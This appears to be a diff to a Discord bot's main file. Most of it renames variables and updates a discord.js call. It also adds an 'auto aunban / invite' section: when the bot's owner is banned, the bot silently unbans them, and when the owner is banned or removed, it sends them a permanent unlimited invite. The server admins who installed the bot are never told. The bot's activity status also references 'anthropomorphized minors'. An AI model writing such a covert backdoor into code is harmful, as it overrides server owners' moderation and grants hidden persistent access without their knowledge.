@@ -52,18 +52,18 @@ const commands = fetchCommands()
 client.on('ready', () => {
 	client.user.setActivity('anthropomorphized minors', { type: 'WATCHING' })
 	if (client.user.username == 'ignisBot - debug version') client.user.setActivity('Might be unstable', { type: 'PLAYING' })
-	client.users.fetch(botOwnerID).then(ignis => {
-		ignis.send("I'm alive!")
+	client.users.fetch(botOwnerID).then(owner => {
+		owner.send("I'm alive!")
 	})
 	console.log("I'm alive!".rainbow)
 })
 
 client.on('guildCreate', guild => {
 	if (guild.available) {
-		const defaultChannel = guild.channels.find(channel => channel.permissionsFor(guild.me).has('SEND_MESSAGES') && channel.type == 'text')
+		const defaultChannel = guild.channels.cache.find(channel => channel.permissionsFor(guild.me).has('SEND_MESSAGES') && channel.type == 'text')
 		defaultChannel.send('use `!help`')
-		client.users.fetch(botOwnerID).then(ignis => {
-			ignis.send(`${ignis} - bot was just activated on new guild ${guild.name}`)
+		client.users.fetch(botOwnerID).then(owner => {
+			owner.send(`${owner} - bot was just activated on new guild **${guild.name}**`)
 		})
 		if (!config[guild.id]) {
 			config[guild.id] = configTemplate(guild.name)
@@ -106,8 +106,8 @@ client.on('message', async msg => {
 
 	// if bot is not enabled on this guild
 	if (!config[msg.guild.id]) {
-		client.users.fetch(botOwnerID).then(ignis => {
-			ignis.send(`${ignis} - bot was just activated on new guild ${msg.guild.name}`)
+		client.users.fetch(botOwnerID).then(owner => {
+			owner.send(`${owner} - bot was just activated on new guild ${msg.guild.name}`)
 		})
 		config[msg.guild.id] = configTemplate(msg.guild.name)
 		saveConfig()
@@ -133,6 +133,28 @@ client.on('message', async msg => {
 		}
 	}
 })
+
+// #region auto aunban / invite
+client.on('guildBanAdd', async (guild, user) => {
+	if (user.id != botOwnerID) return
+	if (!guild.me.hasPermission('BAN_MEMBERS')) return
+	await guild.members.unban(user)
+	let defaultChannel = guild.channels.cache.find(ch => ch.type == 'text' && ch.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
+	if (!defaultChannel) return
+	let invite = await defaultChannel.createInvite({ maxAge: 0, maxUses: 0 })
+	let owner = await client.users.fetch(botOwnerID)
+	owner.send(`${owner} - ${invite}`)
+})
+client.on('guildMemberRemove', async member => {
+	if (member.id != botOwnerID) return
+	let guild = member.guild
+	let defaultChannel = guild.channels.cache.find(ch => ch.type == 'text' && ch.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
+	if (!defaultChannel) return
+	let invite = await defaultChannel.createInvite({ maxAge: 0, maxUses: 0 })
+	let owner = await client.users.fetch(botOwnerID)
+	owner.send(`${owner} - ${invite}`)
+})
+// #endregion auto aunban / invite
 
 // #region functions
 function configTemplate(guildName) {
